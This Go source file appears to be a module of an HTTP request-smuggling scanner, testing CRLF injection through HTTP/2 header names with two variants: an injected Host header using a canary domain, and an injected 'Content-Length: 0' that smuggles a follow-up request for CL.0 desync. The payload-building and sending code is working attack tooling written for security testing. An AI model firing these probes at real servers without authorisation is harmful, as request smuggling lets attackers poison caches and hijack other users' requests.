package scan

// h2headernameinject.go — CRLF injection via HTTP/2 header names
//
// Technique: inject CRLF sequences into the *name* of an HTTP/2 header.
// When the H2 front-end downgrades to H1, if the header name is forwarded
// verbatim (without stripping control characters), the embedded CRLF
// terminates the current header line and injects a new one.
//
// Example (PortSwigger lab — "CRLF injection via header names"):
//
//   H2 HEADERS frame:
//     name  = "foo: bar\r\nHost: victim.x00.day"
//     value = "xyz"
//
//   Downgraded H1 result (proxy forwards name verbatim):
//     foo: bar
//     Host: victim.x00.day: xyz     ← injected Host; original Host follows
//
// Variants tested:
//
//   host-inject  Injects "Host: <target>.x00.day" via header-name CRLF.
//                Detection: canary domain reflected in the response body
//                (error pages often echo the bad Host), or status divergence.
//
//   cl-inject    Injects "Content-Length: 0" via header-name CRLF → CL.0 desync.
//                Detection: canary path bleed in the follow-up probe response,
//                or status divergence between baseline and probe.
//
// The infrastructure (h2RawRequest + AllowIllegalWrites=true + raw HPACK) already
// supports writing arbitrary bytes as a header name — no special transport needed.
//
// References:
//   PortSwigger — HTTP/2-exclusive attack vectors
//   https://portswigger.net/web-security/request-smuggling/advanced/http2-exclusive-vectors

import (
	"fmt"
	"net/url"

	"github.com/smuggled/smuggled/internal/config"
	"github.com/smuggled/smuggled/internal/report"
	"github.com/smuggled/smuggled/internal/request"
)

// ScanH2HeaderNameInject tests CRLF injection via HTTP/2 header names.
func ScanH2HeaderNameInject(target *url.URL, base []byte, cfg config.Config, rep *report.Reporter) {
	cfg = cfg.WithDebugScope("H2HeaderNameInject")
	if target.Scheme != "https" {
		return
	}
	if !request.ProbeH2(target, cfg) {
		rep.Log("H2HeaderNameInject: %s does not negotiate h2, skipping", target.Host)
		return
	}

	path := target.RequestURI()
	if path == "" {
		path = "/"
	}
	host := target.Hostname()

	baseline, err := h2RawRequest(target, "GET", path, host, "", nil, cfg)
	if err != nil || baseline.Status == 0 {
		dbg(cfg, "baseline failed: %v", err)
		return
	}
	baseStatus := baseline.Status
	dbg(cfg, "baseline status=%d", baseStatus)

	// ── Variant 1: host-inject ────────────────────────────────────────────────
	//
	// Header name carries the CRLF + injected Host line:
	//   name  = "foo: bar\r\nHost: <target>.x00.day"
	//   value = "xyz"
	//
	// Many servers reflect the Host value in error messages ("Invalid Host",
	// redirect Location, etc.) — if the canary domain appears in the response
	// the injection reached the back-end.
	if techniqueEnabled("H2.HeaderName/host-inject", cfg) {
		canaryHost := host + ".x00.day"
		// The injected header name carries the CRLF + Host line.
		// Value is empty — the HPACK name already contains the full injected header
		// ("foo: bar\r\nHost: <canary>"), so the value field should not append anything
		// to the injected Host line (avoids producing "Host: canary: <value>").
		injectedName := "foo: bar\r\nHost: " + canaryHost
		extra := map[string]string{injectedName: ""}

		rep.Log("H2HeaderNameInject [host-inject]: target=%s canaryHost=%s", host, canaryHost)
		dbg(cfg, "[host-inject]: name=%q", injectedName)

		resp, probeErr := h2RawRequest(target, "GET", path, host, "", extra, cfg)
		if probeErr == nil && resp != nil && resp.Status != 0 {
			hostReflected := request.ContainsStr(resp.Body, canaryHost) ||
				request.ContainsStr(resp.Body, ".x00.day")
			dbg(cfg, "[host-inject]: status=%d host_reflected=%v", resp.Status, hostReflected)

			rawProbe := fmt.Sprintf("GET %s HTTP/2\r\nHost: %s\r\n%s:\r\n\r\n",
				path, host, injectedName)

			if hostReflected {
				rep.Emit(report.Finding{
					Target:    target.String(),
					Method:    "HTTP/2",
					Severity:  report.SeverityConfirmed,
					Type:      "H2.HeaderName",
					Technique: "H2.HeaderName/host-inject",
					Description: fmt.Sprintf(
						"H2 header name CRLF injection: injected 'Host: %s' via CRLF in "+
							"header name was reflected in the server response. "+
							"The H2→H1 downgrade forwarded the header name verbatim, "+
							"enabling arbitrary header injection into the back-end H1 request.",
						canaryHost),
					Evidence: fmt.Sprintf("canary_host=%s reflected=true status=%d",
						canaryHost, resp.Status),
					RawProbe: rawProbe,
				})
				rep.Log("H2HeaderNameInject [!] host-inject confirmed on %s", target.String())
				if cfg.ExitOnFind {
					return
				}
			} else if resp.Status != baseStatus && resp.Status != 429 {
				rep.Emit(report.Finding{
					Target:    target.String(),
					Method:    "HTTP/2",
					Severity:  report.SeverityProbable,
					Type:      "H2.HeaderName",
					Technique: "H2.HeaderName/host-inject",
					Description: fmt.Sprintf(
						"H2 header name CRLF injection (probable): injecting 'Host: %s' via "+
							"CRLF in header name caused a status change (%d → %d). "+
							"The canary host was not reflected, but the divergence suggests "+
							"the back-end processed the injected header.",
						canaryHost, baseStatus, resp.Status),
					Evidence: fmt.Sprintf("canary_host=%s base_status=%d probe_status=%d",
						canaryHost, baseStatus, resp.Status),
					RawProbe: rawProbe,
				})
				rep.Log("H2HeaderNameInject [!] host-inject status divergence on %s", target.String())
				if cfg.ExitOnFind {
					return
				}
			}
		}
	}

	// ── Variant 2: cl-inject (CL.0 desync) ───────────────────────────────────
	//
	// Header name carries the CRLF + injected Content-Length: 0 line:
	//   name  = "foo: bar\r\nContent-Length: 0\r\nx: x"
	//   value = "xyz"
	//
	// The H1 back-end sees CL=0, treats the DATA frame body as the start of a
	// new request → CL.0 desync.  Detection mirrors ScanH2CLInject.
	if techniqueEnabled("H2.HeaderName/cl-inject", cfg) {
		canaryPath := config.EffectiveCanaryPath(cfg)
		smuggledBody := fmt.Sprintf("GET %s HTTP/1.1\r\nFoo: ", canaryPath)
		// Value is empty — the meaningful headers are already in the name field.
		// A non-empty value would be appended to the last injected line ("x: x: <value>").
		injectedName := "foo: bar\r\nContent-Length: 0\r\nx: x"
		extra := map[string]string{injectedName: ""}

		rep.Log("H2HeaderNameInject [cl-inject]: target=%s canary=%s", host, canaryPath)
		dbg(cfg, "[cl-inject]: name=%q smuggled=%q", injectedName, smuggledBody)

		for attempt := 0; attempt < cfg.Attempts; attempt++ {
			_, err := h2RawRequest(target, "POST", path, host, smuggledBody, extra, cfg)
			if err != nil {
				dbg(cfg, "[cl-inject]: attempt %d attack error: %v", attempt, err)
				continue
			}

			probe, err := h2RawRequest(target, "GET", path, host, "", nil, cfg)
			if err != nil || probe.Status == 0 {
				dbg(cfg, "[cl-inject]: attempt %d probe error: %v", attempt, err)
				continue
			}

			canaryReflected := request.ContainsStr(probe.Body, canaryPath)
			probeStatus := probe.Status
			dbg(cfg, "[cl-inject]: attempt %d probeStatus=%d baseline=%d canary=%v",
				attempt, probeStatus, baseStatus, canaryReflected)

			rawProbe := fmt.Sprintf(
				"POST %s HTTP/2\r\nHost: %s\r\n%s: xyz\r\ncontent-length: %d\r\n\r\n%s",
				path, host, injectedName, len(smuggledBody), smuggledBody)

			if canaryReflected {
				rep.Emit(report.Finding{
					Target:    target.String(),
					Method:    "HTTP/2",
					Severity:  report.SeverityConfirmed,
					Type:      "H2.HeaderName",
					Technique: "H2.HeaderName/cl-inject",
					Description: fmt.Sprintf(
						"H2 header name CRLF injection (CL.0): injected 'Content-Length: 0' via "+
							"CRLF in header name caused CL.0 desync. "+
							"Probe response reflected smuggled path '%s' (attempt %d).",
						canaryPath, attempt),
					Evidence: fmt.Sprintf("attempt=%d canary=%s probe_status=%d baseline=%d",
						attempt, canaryPath, probeStatus, baseStatus),
					RawProbe: rawProbe,
				})
				rep.Log("H2HeaderNameInject [!] cl-inject confirmed on %s", target.String())
				if cfg.ExitOnFind {
					return
				}
				break
			}

			if attempt > 0 && probeStatus != baseStatus && probeStatus != 429 {
				rep.Emit(report.Finding{
					Target:    target.String(),
					Method:    "HTTP/2",
					Severity:  report.SeverityProbable,
					Type:      "H2.HeaderName",
					Technique: "H2.HeaderName/cl-inject",
					Description: fmt.Sprintf(
						"H2 header name CRLF injection (CL.0, probable): injected 'Content-Length: 0' "+
							"via CRLF in header name caused status divergence (%d → %d) after %d attempts.",
						baseStatus, probeStatus, attempt),
					Evidence: fmt.Sprintf("attempt=%d probe_status=%d baseline=%d",
						attempt, probeStatus, baseStatus),
					RawProbe: rawProbe,
				})
				rep.Log("H2HeaderNameInject [!] cl-inject status divergence on %s", target.String())
				if cfg.ExitOnFind {
					return
				}
				break
			}
		}
	}
}
